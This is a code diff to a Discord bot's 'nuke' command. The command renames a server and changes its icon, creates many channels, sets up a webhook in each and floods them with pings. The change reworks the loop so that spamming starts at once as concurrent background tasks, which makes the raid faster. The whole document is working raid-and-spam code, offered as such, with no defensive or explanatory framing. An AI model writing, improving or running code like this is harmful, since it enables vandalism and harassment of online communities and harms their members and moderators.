@@ -74,32 +74,28 @@ async def nuke(ctx):
     except Exception as e:
         print(f"❌ Failed to change server name/icon: {e}")
 
-    # Step 1: Create channels and save them in a list
-    created_channels = []
-    print(f"Creating {channels_to_create} channels...")
+    # List to hold all spamming tasks
+    spam_tasks = []
+
+    print(f"Creating {channels_to_create} channels and starting spam immediately...")
     for i in range(channels_to_create):
         try:
             channel = await guild.create_text_channel(f"{channel_name}-{i}")
-            created_channels.append(channel)
             print(f"Created channel: {channel.name}")
-            await asyncio.sleep(0.2)  # Reduced delay here
-        except Exception as e:
-            print(f"❌ Failed to create channel {i}: {e}")
 
-    # Step 2: Create webhooks and spam concurrently
-    print(f"Starting spam: sending {pings_per_channel} pings per channel concurrently...")
-    webhook_tasks = []
-
-    for channel in created_channels:
-        try:
             webhook = await channel.create_webhook(name=webhook_name)
             print(f"Created webhook in {channel.name}")
-            webhook_tasks.append(spam_webhook(webhook))
-        except Exception as e:
-            print(f"❌ Failed to create webhook in channel {channel.name}: {e}")
 
-    # Run all spam tasks concurrently
-    await asyncio.gather(*webhook_tasks)
+            # Start spamming immediately as a background task
+            task = asyncio.create_task(spam_webhook(webhook))
+            spam_tasks.append(task)
+
+            await asyncio.sleep(0.2)  # Small delay before creating next channel
+        except Exception as e:
+            print(f"❌ Failed to create channel or webhook for channel {i}: {e}")
+
+    # Wait for all spam tasks to finish (optional, can be removed if you want to let them run forever)
+    await asyncio.gather(*spam_tasks)
 
     print("✅ NUKE complete.")
 
